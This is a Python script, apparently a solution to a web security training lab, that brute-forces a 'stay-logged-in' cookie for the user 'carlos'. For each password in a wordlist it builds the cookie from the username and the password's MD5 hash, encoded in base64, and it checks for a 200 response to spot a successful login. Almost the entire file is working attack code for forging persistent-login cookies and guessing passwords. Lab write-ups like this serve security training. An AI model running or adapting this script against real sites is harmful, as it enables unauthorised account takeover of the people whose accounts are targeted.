import requests
import re
import hashlib
import base64

def solve(session, domain):
    url = domain + '/my-account'
    with open('passwordlist.txt') as f:
        for password in f.readlines():
            password = password.strip()
            md5_password = hashlib.md5(password.encode('utf-8')).hexdigest()
            payload = base64.b64encode(b'carlos:' + md5_password.encode('utf-8')).decode('utf-8')
            cookie = {'stay-logged-in': payload}
            print('Trying: ', password)
            r = session.get(url, cookies=cookie, allow_redirects=False)
            if (r.status_code == 200):
                print('Login success with password: ', password)
                break
            
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        try:
            solve(session, domain)
            verify(session, domain)
        except:
            print('Error occured. Please try again.')
